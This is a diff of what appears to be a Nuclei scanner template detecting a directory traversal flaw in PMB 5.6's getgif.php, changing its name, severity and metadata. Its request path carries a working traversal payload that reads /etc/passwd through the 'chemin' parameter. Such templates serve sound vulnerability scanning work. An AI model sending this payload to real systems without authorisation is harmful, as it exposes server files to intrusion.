@@ -1,21 +1,15 @@
 id: pmb-directory-traversal
 
 info:
-  name: PMB 5.6 - Local File Inclusion
+  name: PMB 5.6 - Arbitrary File Retrieval
   author: geeknik
-  severity: high
-  description: PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter.
+  severity: medium
+  description: The PMB Gif Image is not sanitizing the content of the 'chemin' parameter, wchi can be used for local file retrieval.
   reference:
     - https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
-  tags: lfi,packetstorm
-  metadata:
-    max-request: 2
+  tags: lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
@@ -31,5 +25,3 @@ http:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/08/04
